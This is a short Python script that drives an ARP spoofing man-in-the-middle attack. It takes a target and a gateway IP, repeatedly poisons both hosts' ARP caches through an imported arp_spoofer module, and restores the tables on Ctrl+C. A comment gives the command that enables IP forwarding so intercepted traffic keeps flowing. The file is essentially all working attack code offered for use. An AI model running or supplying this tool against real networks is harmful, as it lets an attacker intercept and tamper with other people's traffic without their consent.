#!/usr/bin/env python

import arp_spoofer as arp
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target", help = "Target IP Address ")
    parser.add_argument("-g", "--gateway", dest = "gateway", help = "Gateway IP Address ")
    options = parser.parse_args()
    
    if not options.target:
        parser.error("[-] Please specify target ip, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify gateway ip, use --help for more info.")
    return options.target, options.gateway


#python3 input() for python2 raw_input()
#target_ip = raw_input("[+]Enter target ip :")
#gateway_ip = raw_input("[+]Enter gateway ip :")

target_ip = get_arguments()[0]
gateway_ip = get_arguments()[1]

send_packets_count = 0
try:
    while True:
        arp.spoof(target_ip, gateway_ip)
        arp.spoof(gateway_ip, target_ip)
        send_packets_count = send_packets_count + 2
        #python 3target_ip
        #print("\r[+] Packets Sent :" + str(send_packets_count), end="")
        #python2
        print("\r[+] Packets Sent :" + str(send_packets_count)),
        arp.sys.stdout.flush()
        arp.time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected Ctrl + C.....Resetting ARP tables.....Please Wait.\n")
    arp.restore(target_ip, gateway_ip)


#We need packet to flow : echo 1 > /proc/sys/net/ipv4/ip_forward